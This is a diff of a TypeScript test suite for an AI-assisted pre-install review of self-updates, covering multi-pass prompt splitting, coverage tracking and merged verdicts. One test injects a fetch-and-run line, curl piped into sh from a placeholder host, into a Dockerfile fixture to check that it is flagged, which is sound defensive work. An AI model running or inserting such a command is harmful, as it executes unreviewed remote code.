@@ -5,14 +5,18 @@ import { createExecutionEnvelope } from "../src/hermes-security.js";
 import { DIENSTE_REVIEW_INSTRUCTIONS, UPDATE_REVIEW_INSTRUCTIONS } from "../src/update-review-prompt.js";
 import {
   applyUpdateReviewPolicy,
-  buildUpdateReviewPrompt,
+  buildUpdateReviewPasses,
   materialOrder,
+  mergeUpdateReviewAnswers,
   normalizeUpdateBindings,
   UPDATE_KINDS,
+  UPDATE_REVIEW_MAX_PASSES,
+  UPDATE_REVIEW_PROMPT_LIMIT,
   parseUpdateDiff,
   parseUpdateReviewAnswer,
   redactSecrets,
   reviewedDiffFor,
+  runUpdateReviewPasses,
   selfUpdateTargets,
   summarizeUpdateReview,
   updateBindings,
@@ -54,6 +58,13 @@ function diff(overrides: Partial<UpdateDiff> = {}): UpdateDiff {
     truncated: false, partialFiles: [], omittedFiles: [],
     ...overrides,
   };
+}
+
+// All passes' prompts in one string (most cases need one pass); the single
+// prompts stay in `prompts`.
+function buildUpdateReviewPrompt(diffs: UpdateDiff[], options: Parameters<typeof buildUpdateReviewPasses>[1] = {}) {
+  const { prompts, coverage } = buildUpdateReviewPasses(diffs, options);
+  return { prompt: prompts.join("\n"), prompts, coverage };
 }
 
 function runnerJson(overrides: Record<string, unknown> = {}): string {
@@ -111,7 +122,9 @@ describe("self-update pre-install review", () => {
     expect(change).toBeLessThan(end);
     expect(prompt.slice(end)).toContain("Answer now, starting with the VERDICT line");
     expect(prompt).toContain("The excerpt is complete");
-    expect(coverage).toEqual([{ sha: SHA, incomplete: [], cut: [], omitted: [] }]);
+    expect(coverage).toEqual([{ sha: SHA, incomplete: [], cut: [], omitted: [], passes: [["apps/api/src/hermes-security.ts", "README.md"]] }]);
+    // One pass: no pass notice.
+    expect(prompt).not.toContain("## Review pass");
   });
 
   it("describes the one door: the doorkeeper's pass is intended, a way past lock, doorkeeper, bolt or net is a finding", () => {
@@ -137,28 +150,32 @@ describe("self-update pre-install review", () => {
     expect(answer.findings[0].guarantee).toBe("G10");
   });
 
-  it("stops when the excerpt is truncated inside a focus area", () => {
+  it("stops when a focus-area file is larger than a whole pass", () => {
     const big = section("apps/api/src/hermes-security.ts", ["@@ -1,400 +1,400 @@", ...Array.from({ length: 400 }, (_, index) => `+line ${index} ${"x".repeat(60)}`)]);
-    const { prompt, coverage } = buildUpdateReviewPrompt([diff({ excerpt: [big] })], { nonce: NONCE, limit: 15_000 });
-    expect(Buffer.byteLength(prompt)).toBeLessThanOrEqual(15_000);
-    expect(coverage[0]).toMatchObject({ incomplete: ["apps/api/src/hermes-security.ts"], cut: ["apps/api/src/hermes-security.ts"] });
-    expect(prompt).toContain("The excerpt is INCOMPLETE");
-    expect(prompt).toContain("[... apps/api/src/hermes-security.ts truncated for the review budget ...]");
+    const { prompts, coverage } = buildUpdateReviewPrompt([diff({ excerpt: [big] })], { nonce: NONCE, limit: 15_000 });
+    expect(prompts.every((prompt) => Buffer.byteLength(prompt) <= 15_000)).toBe(true);
+    // Never cut into pieces: left out whole, and that stops.
+    expect(coverage[0]).toMatchObject({ incomplete: ["apps/api/src/hermes-security.ts"], cut: [], omitted: ["apps/api/src/hermes-security.ts"] });
+    expect(prompts.join("\n")).toContain("The excerpt is INCOMPLETE. Cut: none. Left out: apps/api/src/hermes-security.ts.");
+    expect(prompts.join("\n")).not.toContain("+line 0 ");
     const policy = applyUpdateReviewPolicy(readyPolicy, outcome({ coverage, answer: parseUpdateReviewAnswer("VERDICT: approve") }));
     expect(policy).toMatchObject({ allowed: false, status: "blocked_prerequisite", zone: "red" });
     expect(policy.reason).toContain("1 file(s) the reviewer must see completely were not fully visible to it");
     expect(policy.evidence).toContain(`not fully reviewed (${SHA.slice(0, 12)}): apps/api/src/hermes-security.ts`);
   });
 
-  it("does not stop when only files outside the focus areas are cut", () => {
+  it("does not stop when only documentation is cut, and documentation never opens a pass", () => {
     const big = section("README.md", ["@@ -1 +1,400 @@", ...Array.from({ length: 400 }, (_, index) => `+docs ${index} ${"y".repeat(60)}`)]);
     const small = diff().excerpt[0];
-    const { coverage } = buildUpdateReviewPrompt([diff({ excerpt: [small, big, section("docs/other.md", ["@@ -1 +1 @@", "-a", "+b"])] })], { nonce: NONCE, limit: 15_000 });
-    // The big README is skipped and cut with what is left; the small doc behind it still fits.
-    expect(coverage[0]).toEqual({ sha: SHA, incomplete: [], cut: ["README.md"], omitted: [] });
+    const { prompts, coverage } = buildUpdateReviewPrompt([diff({ excerpt: [small, big, section("docs/other.md", ["@@ -1 +1 @@", "-a", "+b"])] })], { nonce: NONCE, limit: 20_000 });
+    // The big README is cut with what is left after everything else; the small doc behind it is whole.
+    expect(prompts).toHaveLength(1);
+    expect(coverage[0]).toMatchObject({ sha: SHA, incomplete: [], cut: ["README.md"], omitted: [] });
+    expect(prompts[0]).toContain("+b\n");
+    expect(Buffer.byteLength(prompts[0])).toBeLessThanOrEqual(20_000);
     // Cut by the runner: named as cut, also when it fits here.
-    const runnerCut = buildUpdateReviewPrompt([diff({ excerpt: [small, big, section("docs/other.md", ["@@ -1 +1 @@", "-a", "+b"])], partialFiles: ["docs/other.md"] })], { nonce: NONCE, limit: 15_000 });
-    expect(runnerCut.coverage[0]).toEqual({ sha: SHA, incomplete: [], cut: ["docs/other.md", "README.md"], omitted: [] });
+    const runnerCut = buildUpdateReviewPrompt([diff({ excerpt: [small, big, section("docs/other.md", ["@@ -1 +1 @@", "-a", "+b"])], partialFiles: ["docs/other.md"] })], { nonce: NONCE, limit: 20_000 });
+    expect(runnerCut.coverage[0]).toMatchObject({ incomplete: [], cut: ["docs/other.md", "README.md"], omitted: [] });
   });
 
   it("treats runner-truncated, omitted and binary focus files as incomplete", () => {
@@ -188,7 +205,7 @@ describe("self-update pre-install review", () => {
     expect(prompt).toMatch(/\.\.\. \d+ more changed file\(s\) outside the focus areas/);
   });
 
-  it("put the deploy material in front of tests and docs, so it survives the budget", () => {
+  it("puts the deploy material in front of tests and docs, into the first pass", () => {
     const deploy = section("deploy/vps/vps-cockpit-deploy.sh", ["@@ -1,3 +1,4 @@", " set -euo pipefail", "+install -m 0755 deploy/helpers/cockpit-borg-action /usr/local/sbin/", " borgmatic install"]);
     const tests = section("apps/api/test/app.test.ts", ["@@ -1,300 +1,300 @@", ...Array.from({ length: 300 }, (_, index) => `+test ${index} ${"x".repeat(60)}`)]);
     const docs = section("doc/setup/borg-maintenance.md", ["@@ -1 +1,2 @@", " borg ops", "+repair needs the operator"]);
@@ -205,19 +222,21 @@ describe("self-update pre-install review", () => {
     });
     expect(materialOrder(runnerOrder.excerpt).map((item) => item.path))
       .toEqual(["deploy/vps/vps-cockpit-deploy.sh", "apps/api/test/app.test.ts", "doc/setup/borg-maintenance.md"]);
-    const { prompt, coverage } = buildUpdateReviewPrompt([runnerOrder], { nonce: NONCE, limit: 15_000 });
-    // The deploy script is in the material up to its last line; the big test file
-    // took the rest of the budget and is named as cut.
-    expect(prompt).toContain("+install -m 0755 deploy/helpers/cockpit-borg-action /usr/local/sbin/");
-    expect(prompt).toContain("+test 0 ");
-    expect(prompt).not.toContain("+test 299 ");
-    expect(coverage[0].cut).toEqual(["apps/api/test/app.test.ts"]);
-    // The small doc behind the big test file is no longer dropped with it.
-    expect(prompt).toContain("+repair needs the operator");
-    expect(coverage[0].omitted).toEqual([]);
-    expect(prompt).toContain("Cut: apps/api/test/app.test.ts. Left out: none.");
-    // Only a test file is cut: no stop.
-    expect(coverage[0].incomplete).toEqual([]);
+    // Root and build material first, the lockfile next, documentation last.
+    expect(materialOrder([
+      "doc/a.md", "apps/api/src/app.ts", "package-lock.json", "Dockerfile.web", "apps/api/package.json", "ops/cockpit-capability-action.mjs", "deploy/systemd/x.service",
+    ].map((path) => ({ path, text: "" })), UPDATE_KINDS.self.supplementary).map((item) => item.path))
+      .toEqual(["Dockerfile.web", "apps/api/package.json", "ops/cockpit-capability-action.mjs", "deploy/systemd/x.service", "package-lock.json", "apps/api/src/app.ts", "doc/a.md"]);
+    const { prompts, coverage } = buildUpdateReviewPrompt([runnerOrder], { nonce: NONCE, limit: 40_000 });
+    expect(prompts.every((prompt) => Buffer.byteLength(prompt) <= 40_000)).toBe(true);
+    // Every file complete, the deploy script in front of the test file.
+    expect(coverage[0]).toMatchObject({ incomplete: [], cut: [], omitted: [] });
+    const all = prompts.join("\n");
+    expect(all).toContain("+install -m 0755 deploy/helpers/cockpit-borg-action /usr/local/sbin/");
+    expect(all).toContain("+test 299 ");
+    expect(all).toContain("+repair needs the operator");
+    expect(prompts[0].indexOf("diff --git a/deploy/vps/vps-cockpit-deploy.sh")).toBeGreaterThan(0);
+    expect(prompts[0].indexOf("diff --git a/deploy/vps/vps-cockpit-deploy.sh")).toBeLessThan(prompts[0].indexOf("diff --git a/apps/api/test/app.test.ts"));
   });
 
   it("names and stops on deploy material the runner never excerpted", () => {
@@ -241,7 +260,7 @@ describe("self-update pre-install review", () => {
   // the runner ordered Dockerfile.api (class other, repository root) behind four
   // test files; the first test that did not fit was cut and every section behind
   // it left out, so the reviewer answered UNVERIFIABLE (G8) for a file it never got.
-  it("keeps a small build file behind big test files in the material (Dockerfile.api, cba7628)", () => {
+  it("reviews big test files in further passes, the small build file in the first (Dockerfile.api, cba7628)", () => {
     const dockerfile = section("Dockerfile.api", ["@@ -30,7 +30,8 @@", " COPY --from=build /workspace/deploy/helpers/cockpit-backup-guard.mjs ./deploy/helpers/cockpit-backup-guard.mjs", "+COPY --from=build /workspace/deploy/helpers/cockpit-state-steps.mjs ./deploy/helpers/cockpit-state-steps.mjs"]);
     const big = (path: string) => section(path, ["@@ -1,200 +1,200 @@", ...Array.from({ length: 200 }, (_, index) => `+${path} ${index} ${"t".repeat(60)}`)]);
     const tests = ["apps/api/test/host-run-flow.test.ts", "apps/api/test/host-run-helper.test.ts", "apps/api/test/reactivate.test.ts"];
@@ -257,47 +276,60 @@ describe("self-update pre-install review", () => {
       // The runner's order: focus first, then tests (class 4), then other (class 5).
       excerpt: [diff().excerpt[0], ...tests.map(big), dockerfile, docs],
     });
-    const { prompt, coverage } = buildUpdateReviewPrompt([shape], { nonce: NONCE, limit: 26_000 });
-    expect(Buffer.byteLength(prompt)).toBeLessThanOrEqual(26_000);
-    // Before this fix: Left out: ..., Dockerfile.api, doc/setup/host-run.md.
-    expect(prompt).toContain("+COPY --from=build /workspace/deploy/helpers/cockpit-state-steps.mjs ./deploy/helpers/cockpit-state-steps.mjs");
-    expect(prompt.indexOf("diff --git a/Dockerfile.api")).toBeLessThan(prompt.indexOf("diff --git a/apps/api/test/"));
-    expect(coverage[0].omitted).not.toContain("Dockerfile.api");
-    expect(coverage[0].cut).not.toContain("Dockerfile.api");
-    expect(coverage[0].incomplete).toEqual([]);
-    // Only tests were cut or left out; the review is not stopped for them.
-    expect([...coverage[0].cut, ...coverage[0].omitted].every((path) => tests.includes(path))).toBe(true);
-    expect(coverage[0].cut.length + coverage[0].omitted.length).toBeGreaterThan(0);
-    const policy = applyUpdateReviewPolicy(readyPolicy, outcome({ coverage, answer: parseUpdateReviewAnswer("VERDICT: approve") }));
+    const { prompts, coverage } = buildUpdateReviewPrompt([shape], { nonce: NONCE, limit: 40_000 });
+    expect(prompts.length).toBeGreaterThan(1);
+    expect(prompts.every((prompt) => Buffer.byteLength(prompt) <= 40_000)).toBe(true);
+    expect(prompts[0]).toContain("+COPY --from=build /workspace/deploy/helpers/cockpit-state-steps.mjs ./deploy/helpers/cockpit-state-steps.mjs");
+    expect(prompts[0].indexOf("diff --git a/Dockerfile.api")).toBeLessThan(prompts[0].indexOf("diff --git a/apps/api/"));
+    // Nothing cut, nothing left out: every file in exactly one pass.
+    expect(coverage[0]).toMatchObject({ incomplete: [], cut: [], omitted: [] });
+    const placed = coverage[0].passes!.flat();
+    expect(placed.sort()).toEqual(shape.excerpt.map((item) => item.path).sort());
+    // Each pass tells the reviewer what the other passes hold.
+    expect(prompts[0]).toContain(`This is review pass 1 of ${prompts.length}.`);
+    expect(prompts[1]).toMatch(/The other passes of this update hold: [^\n]*Dockerfile\.api/);
+    expect(prompts.every((prompt) => prompt.includes("The excerpt is complete"))).toBe(true);
+    const policy = applyUpdateReviewPolicy(readyPolicy, outcome({ coverage, answer: mergeUpdateReviewAnswers(prompts.map(() => parseUpdateReviewAnswer("VERDICT: approve"))) }));
     expect(policy).toMatchObject({ allowed: true, status: "ready" });
   });
 
-  it("stops instead of leaving a gap when a required file does not fit at all", () => {
+  it("stops instead of leaving a gap when a required file does not fit a pass at all", () => {
     const huge = section("Dockerfile.api", ["@@ -1,400 +1,400 @@", ...Array.from({ length: 400 }, (_, index) => `+RUN step ${index} ${"d".repeat(60)}`)]);
-    const { prompt, coverage } = buildUpdateReviewPrompt([diff({
+    const { prompts, coverage } = buildUpdateReviewPrompt([diff({
       files: [...diff().files, { status: "M", path: "Dockerfile.api", added: 400, deleted: 400, class: "other" }],
       filesTotal: 3, excerpt: [...diff().excerpt, huge],
     })], { nonce: NONCE, limit: 15_000 });
-    expect(coverage[0].cut).toEqual(["Dockerfile.api"]);
-    expect(coverage[0].incomplete).toEqual(["Dockerfile.api"]);
-    expect(prompt).toContain("[... Dockerfile.api truncated for the review budget ...]");
+    expect(coverage[0]).toMatchObject({ cut: [], omitted: ["Dockerfile.api"], incomplete: ["Dockerfile.api"] });
+    expect(prompts.join("\n")).toContain("Left out: Dockerfile.api.");
     const policy = applyUpdateReviewPolicy(readyPolicy, outcome({ coverage, answer: parseUpdateReviewAnswer("VERDICT: approve") }));
     expect(policy).toMatchObject({ allowed: false, status: "blocked_prerequisite" });
     expect(policy.evidence).toContain(`not fully reviewed (${SHA.slice(0, 12)}): Dockerfile.api`);
+    // Beyond the pass limit: left out, a stop too.
+    const many = Array.from({ length: 6 }, (_, index) => section(`apps/api/src/part-${index}.ts`, ["@@ -1,100 +1,100 @@", ...Array.from({ length: 100 }, (_, line) => `+${index} ${line} ${"p".repeat(60)}`)]));
+    const capped = buildUpdateReviewPrompt([diff({
+      files: many.map((item) => ({ status: "M", path: item.path, added: 100, deleted: 100, class: "other" })), filesTotal: 6, focusAreas: [], excerpt: many,
+    })], { nonce: NONCE, limit: 24_000, maxPasses: 2 });
+    expect(capped.prompts).toHaveLength(2);
+    expect(capped.coverage[0].incomplete.length).toBeGreaterThan(0);
+    expect(capped.coverage[0].omitted).toEqual(capped.coverage[0].incomplete);
   });
 
-  it("stays inside the limit when many files are cut or left out, also over two updates", () => {
-    const tests = Array.from({ length: 120 }, (_, index) => `apps/api/test/generated/very/long/path/number-${index}-of-many.test.ts`);
+  it("stays inside the limit when many docs are cut or left out, also over two updates", () => {
+    const docs = Array.from({ length: 120 }, (_, index) => `doc/generated/very/long/path/number-${index}-of-many.md`);
     const one = (sha: string) => diff({
       sha,
-      files: [...diff().files, ...tests.map((path) => ({ status: "M", path, added: 50, deleted: 0, class: "test" }))],
+      files: [...diff().files, ...docs.map((path) => ({ status: "M", path, added: 50, deleted: 0, class: "other" }))],
       filesTotal: 122,
-      excerpt: [...diff().excerpt, ...tests.map((path) => section(path, ["@@ -0,0 +1,50 @@", ...Array.from({ length: 50 }, (_, index) => `+${index} ${"q".repeat(60)}`)]))],
+      excerpt: [...diff().excerpt, ...docs.map((path) => section(path, ["@@ -0,0 +1,50 @@", ...Array.from({ length: 50 }, (_, index) => `+${index} ${"q".repeat(60)}`)]))],
     });
-    const { prompt, coverage } = buildUpdateReviewPrompt([one(SHA), one("f".repeat(40))], { nonce: NONCE, limit: 40_000 });
-    expect(Buffer.byteLength(prompt)).toBeLessThanOrEqual(40_000);
-    expect(prompt).toMatch(/Left out: [^\n]*\.\.\. \(\d+ more\)\./);
-    // The coverage keeps every name; only tests are missing, so no stop.
+    const { prompts, coverage } = buildUpdateReviewPrompt([one(SHA), one("f".repeat(40))], { nonce: NONCE, limit: 40_000 });
+    // Documentation opens no pass: one pass per update.
+    expect(prompts).toHaveLength(2);
+    expect(prompts.every((prompt) => Buffer.byteLength(prompt) <= 40_000)).toBe(true);
+    expect(prompts[1]).toMatch(/Left out: [^\n]*\.\.\. \(\d+ more\)\./);
+    expect(prompts[1]).toContain(`# Update 2/2: ${"f".repeat(40)}`);
+    expect(prompts[1]).not.toContain(`# Update 1/2: ${SHA}`);
+    // The coverage keeps every name; only docs are missing, so no stop.
     expect(coverage[1].omitted.length + coverage[1].cut.length).toBeGreaterThan(100);
     expect(coverage.map((item) => item.incomplete)).toEqual([[], []]);
   });
@@ -320,8 +352,8 @@ describe("self-update pre-install review", () => {
       filesTotal: 1_502,
       focusAreas: [...diff().focusAreas, area("tests-deleted", deleted, [])],
     });
-    const { prompt, coverage } = buildUpdateReviewPrompt([mass, { ...mass, sha: "f".repeat(40) }], { nonce: NONCE, limit: 60_000 });
-    expect(Buffer.byteLength(prompt)).toBeLessThanOrEqual(60_000);
+    const { prompt, prompts, coverage } = buildUpdateReviewPrompt([mass, { ...mass, sha: "f".repeat(40) }], { nonce: NONCE, limit: 60_000 });
+    expect(prompts.every((item) => Buffer.byteLength(item) <= 60_000)).toBe(true);
     expect(prompt).toContain("[... update description clipped for the review budget ...]");
     expect(coverage[0].incomplete).toContain("(the update description: focus areas or file list clipped)");
   });
@@ -331,11 +363,12 @@ describe("self-update pre-install review", () => {
     expect(coverage[0].incomplete).toEqual(["(2003 changed file(s) the runner did not list)"]);
   });
 
-  it("supplementary files: tests, markdown and the lockfile for self; only markdown for dienste", () => {
+  it("supplementary files: only markdown and the summarized lockfile, for both repositories", () => {
     const self = UPDATE_KINDS.self.supplementary;
-    expect(["apps/api/test/a.test.ts", "test/x.sh", "doc/setup/a.md", "AGENTS.md", "package-lock.json", "apps/web/src/x.spec.tsx"].every(self)).toBe(true);
+    expect(["doc/setup/a.md", "AGENTS.md", "package-lock.json", "skills/cockpit-skill.md"].every(self)).toBe(true);
+    // Tests are reviewed completely since the review runs in passes (12.10.2026);
     // bin/gen-*.md are runbook plans read at runtime, not documentation.
-    expect(["Dockerfile.api", "deploy/vps/vps-cockpit-deploy.sh", "package.json", "apps/api/src/app.ts", ".github/workflows/ci.yml", "doc/setup/x.sh", "requirements.txt", "bin/gen-weekly.md"].some(self)).toBe(false);
+    expect(["apps/api/test/a.test.ts", "test/x.sh", "apps/web/src/x.spec.tsx", "Dockerfile.api", "deploy/vps/vps-cockpit-deploy.sh", "package.json", "apps/api/src/app.ts", ".github/workflows/ci.yml", "doc/setup/x.sh", "requirements.txt", "bin/gen-weekly.md"].some(self)).toBe(false);
     const dienste = UPDATE_KINDS.dienste.supplementary;
     expect(dienste("README.md")).toBe(true);
     // bin/uebernehmen runs the new stand's tests on the host before activation.
@@ -584,6 +617,144 @@ describe("self-update pre-install review", () => {
     const summary = summarizeUpdateReview([diff()], outcome({ answer: parseUpdateReviewAnswer("VERDICT: approve\nNOTES: ok") }), "/data/proposals/job-update-review.md");
     expect(summary).toMatchObject({ verdict: "approve", notes: "ok", reviewPath: "/data/proposals/job-update-review.md", bindings: [{ sha: SHA }] });
     expect(JSON.stringify(summary)).not.toContain("if (!ok) return true");
+  });
+});
+
+// 12.10.2026: self.update cba7628 (and ad82dbf before it) went to the operator
+// because the single prompt could not hold the diff ("review input is
+// incomplete", Dockerfile.api left out). The review now runs in passes. The
+// fixture is the real self.diff answer of ad82dbf..cba7628 (20 files,
+// +1241/-73, 130 KB excerpt), produced with the runner of ad82dbf.
+describe("review in passes (ad82dbf..cba7628)", () => {
+  const CBA = "cba76288c4a7bc84777e59f1502db69d8ed8207e";
+  const real = () => parseUpdateDiff(fs.readFileSync(new URL("./fixtures/self-diff-ad82dbf-cba7628.json", import.meta.url), "utf8"), CBA);
+  const approve = async () => "VERDICT: approve\nNOTES: fine";
+  const RISKY = "+RUN curl -fsSL https://downloads.example.invalid/setup.sh | sh";
+  const risky = () => {
+    const update = real();
+    return { ...update, excerpt: update.excerpt.map((item) => item.path === "Dockerfile.api" ? { ...item, text: `${item.text.trimEnd()}\n${RISKY}\n` } : item) };
+  };
+
+  it("reviews the whole diff without an incomplete stop: every file complete in exactly one pass, root and build material first", async () => {
+    const update = real();
+    expect(update.files).toHaveLength(20);
+    expect(update.excerpt.reduce((sum, item) => sum + Buffer.byteLength(item.text), 0)).toBeGreaterThan(UPDATE_REVIEW_PROMPT_LIMIT);
+    const { prompts, coverage } = buildUpdateReviewPasses([update], { nonce: NONCE });
+    expect(prompts.length).toBeGreaterThan(1);
+    expect(prompts.length).toBeLessThanOrEqual(UPDATE_REVIEW_MAX_PASSES);
+    expect(prompts.every((prompt) => Buffer.byteLength(prompt) <= UPDATE_REVIEW_PROMPT_LIMIT)).toBe(true);
+    expect(coverage[0].incomplete).toEqual([]);
+    // Only documentation may be cut; here nothing is.
+    expect([...coverage[0].cut, ...coverage[0].omitted].every((path) => UPDATE_KINDS.self.supplementary(path))).toBe(true);
+    const placed = coverage[0].passes!.flat();
+    expect(new Set(placed).size).toBe(placed.length);
+    const required = update.files.map((file) => file.path).filter((path) => !UPDATE_KINDS.self.supplementary(path));
+    expect(required.every((path) => placed.includes(path) && !coverage[0].cut.includes(path))).toBe(true);
+    // Each file's section is in its pass verbatim.
+    for (const [index, paths] of coverage[0].passes!.entries()) {
+      for (const path of paths.filter((item) => !coverage[0].cut.includes(item))) {
+        expect(prompts[index]).toContain(update.excerpt.find((item) => item.path === path)!.text.trimEnd());
+      }
+    }
+    // Dockerfile.api and the whole deploy tree are in the first pass.
+    const first = coverage[0].passes![0];
+    expect(first).toContain("Dockerfile.api");
+    expect(update.files.map((file) => file.path).filter((path) => path.startsWith("deploy/")).every((path) => first.includes(path))).toBe(true);
+    expect(prompts[0]).toContain("+COPY --from=build /workspace/deploy/helpers/cockpit-state-steps.mjs");
+    const result = await runUpdateReviewPasses(prompts, approve);
+    const policy = applyUpdateReviewPolicy(readyPolicy, { bindings: updateBindings([update]), coverage, ...result });
+    expect(policy).toMatchObject({ allowed: true, status: "ready" });
+    expect(policy.evidence).toContain("pre-install review result: pass");
+    expect(policy.reason).not.toContain("incomplete");
+  });
+
+  it("finds a deliberately risky hunk in Dockerfile.api: the flagging pass reaches the operator", async () => {
+    const update = risky();
+    const { prompts, coverage } = buildUpdateReviewPasses([update], { nonce: NONCE });
+    expect(coverage[0].incomplete).toEqual([]);
+    const holding = prompts.filter((prompt) => prompt.includes(RISKY));
+    expect(holding).toHaveLength(1);
+    expect(prompts[0]).toBe(holding[0]);
+    // A reviewer that flags what it sees and approves everything else.
+    const seen: number[] = [];
+    const reviewer = async (prompt: string) => {
+      seen.push(prompts.indexOf(prompt));
+      return prompt.includes(RISKY)
+        ? ["VERDICT: flag", "FINDING: build pipes a remote script into a shell", "GUARANTEE: G8", "FILE: Dockerfile.api:38", `CODE: ${RISKY}`, "REASON: unreviewed code from an unusual source runs in the API image", "SEVERITY: high"].join("\n")
+        : "VERDICT: approve";
+    };
+    const result = await runUpdateReviewPasses(prompts, reviewer);
+    // Every pass is asked, in order.
+    expect(seen).toEqual(prompts.map((_, index) => index));
+    expect(result.answer).toMatchObject({ verdict: "flag", problem: null });
+    expect(result.answer!.findings).toHaveLength(1);
+    expect(result.answer!.findings[0]).toMatchObject({ guarantee: "G8", quoteFound: true });
+    const policy = applyUpdateReviewPolicy(readyPolicy, { bindings: updateBindings([update]), coverage, ...result });
+    expect(policy).toMatchObject({ allowed: false, status: "blocked_user_approval" });
+    expect(policy.reason).toContain("the reviewer flagged 1 finding(s): build pipes a remote script into a shell");
+    expect(policy.evidence.find((item) => item.startsWith("FINDING [G8, high]"))).toContain("found in the reviewed diff");
+  });
+
+  it("unites the passes: one flag wins, a broken pass is a gap beside it and a stop on its own", async () => {
+    const flag = parseUpdateReviewAnswer("VERDICT: flag\nFINDING: x\nGUARANTEE: G4\nFILE: deploy/sudoers/cockpit-executor:3\nCODE: ALL\nREASON: r\nSEVERITY: high");
+    const ok = parseUpdateReviewAnswer("VERDICT: approve\nNOTES: tidy");
+    const garbage = parseUpdateReviewAnswer("looks fine");
+    expect(mergeUpdateReviewAnswers([ok, ok])).toEqual({ verdict: "approve", findings: [], notes: "pass 1/2: tidy\npass 2/2: tidy", problem: null });
+    expect(mergeUpdateReviewAnswers([ok, flag])).toMatchObject({ verdict: "flag", findings: [{ title: "x" }], problem: null });
+    expect(mergeUpdateReviewAnswers([flag, flag]).findings).toHaveLength(2);
+    expect(mergeUpdateReviewAnswers([ok, garbage])).toMatchObject({ verdict: "invalid", problem: "pass 2/2: expected exactly one VERDICT line, got 0" });
+    expect(mergeUpdateReviewAnswers([garbage, flag])).toMatchObject({ verdict: "flag", problem: "pass 1/2: expected exactly one VERDICT line, got 0" });
+    expect(mergeUpdateReviewAnswers([null, null])).toBeNull();
+    expect(mergeUpdateReviewAnswers([ok])).toBe(ok);
+    // approve + unparseable: incomplete, never a pass.
+    expect(updateReviewFindings(outcome({ answer: mergeUpdateReviewAnswers([ok, garbage])! })).result).toBe("incomplete");
+    // flag + unparseable: the finding goes to the operator, the broken pass is named.
+    const both = applyUpdateReviewPolicy(readyPolicy, outcome({ answer: mergeUpdateReviewAnswers([garbage, flag])! }));
+    expect(both).toMatchObject({ status: "blocked_user_approval" });
+    expect(both.reason).toContain("part of the review gave no usable answer (pass 1/2: expected exactly one VERDICT line, got 0)");
+    // flag without a finding + approve: incomplete.
+    expect(updateReviewFindings(outcome({ answer: mergeUpdateReviewAnswers([ok, parseUpdateReviewAnswer("VERDICT: flag")])! })).result).toBe("incomplete");
+  });
+
+  it("never counts a path as complete when one of its sections is missing (type change: two sections, one path)", () => {
+    const path = "deploy/helpers/cockpit-x";
+    const gone = { path, text: `diff --git a/${path} b/${path}\ndeleted file mode 120000\n--- a/${path}\n+++ /dev/null\n@@ -1 +0,0 @@\n-target\n` };
+    const added = section(path, ["@@ -0,0 +1,400 @@", ...Array.from({ length: 400 }, (_, index) => `+echo ${index} ${"r".repeat(60)}`)]);
+    const typeChange = diff({ files: [{ status: "T", path, added: 400, deleted: 1, class: "focus" }], filesTotal: 1, focusAreas: [area("root-helpers", [path], ["G4"])], excerpt: [gone, added] });
+    // The new content is larger than a pass: left out, so the path is incomplete.
+    expect(buildUpdateReviewPrompt([typeChange], { nonce: NONCE, limit: 20_000 }).coverage[0].incomplete).toEqual([path]);
+    // The runner left the second section out itself.
+    expect(buildUpdateReviewPrompt([{ ...typeChange, excerpt: [gone], omittedFiles: [path], truncated: true }], { nonce: NONCE }).coverage[0].incomplete).toEqual([path]);
+    // Both sections fit: complete, in one pass.
+    const whole = buildUpdateReviewPrompt([{ ...typeChange, excerpt: [gone, section(path, ["@@ -0,0 +1 @@", "+echo ok"])] }], { nonce: NONCE });
+    expect(whole.coverage[0]).toMatchObject({ incomplete: [], passes: [[path, path]] });
+  });
+
+  it("never drops an evidenced finding behind UNVERIFIABLE points when it bounds the union", () => {
+    const vague = parseUpdateReviewAnswer(["VERDICT: flag", ...Array.from({ length: 10 }, (_, index) => `FINDING: vague ${index}\nGUARANTEE: UNVERIFIABLE\nFILE: a:1\nCODE: x\nREASON: r\nSEVERITY: medium`)].join("\n"));
+    const real = parseUpdateReviewAnswer("VERDICT: flag\nFINDING: signature dropped\nGUARANTEE: G2\nFILE: apps/api/src/hermes-security.ts:1\nCODE: x\nREASON: r\nSEVERITY: high");
+    const merged = mergeUpdateReviewAnswers([vague, vague, vague, real])!;
+    expect(merged.findings).toHaveLength(30);
+    expect(merged.findings[0].title).toBe("signature dropped");
+    expect(updateReviewFindings(outcome({ answer: merged })).result).toBe("finding");
+  });
+
+  it("keeps asking after a failed pass, and the failure never lets the update pass", async () => {
+    const prompts = ["p1", "p2", "p3"];
+    const failing = async (prompt: string) => {
+      if (prompt === "p2") throw new Error("agent broker timed out");
+      return prompt === "p3" ? "VERDICT: flag\nFINDING: y\nGUARANTEE: G2\nFILE: a:1\nCODE: z\nREASON: r\nSEVERITY: medium" : "VERDICT: approve";
+    };
+    const result = await runUpdateReviewPasses(prompts, failing);
+    expect(result.reviewerError).toBe("pass 2/3: agent broker timed out");
+    expect(result.answer).toMatchObject({ verdict: "flag", findings: [{ title: "y" }] });
+    const flagged = applyUpdateReviewPolicy(readyPolicy, outcome(result));
+    expect(flagged).toMatchObject({ status: "blocked_user_approval" });
+    expect(flagged.reason).toContain("the reviewer did not answer (pass 2/3: agent broker timed out)");
+    const quiet = await runUpdateReviewPasses(prompts, async (prompt) => { if (prompt === "p2") throw new Error("down"); return "VERDICT: approve"; });
+    expect(applyUpdateReviewPolicy(readyPolicy, outcome(quiet))).toMatchObject({ allowed: false, status: "blocked_prerequisite" });
+    const silent = await runUpdateReviewPasses(["p1"], async () => { throw new Error("down"); });
+    expect(silent).toEqual({ reviewerError: "down" });
   });
 });
 
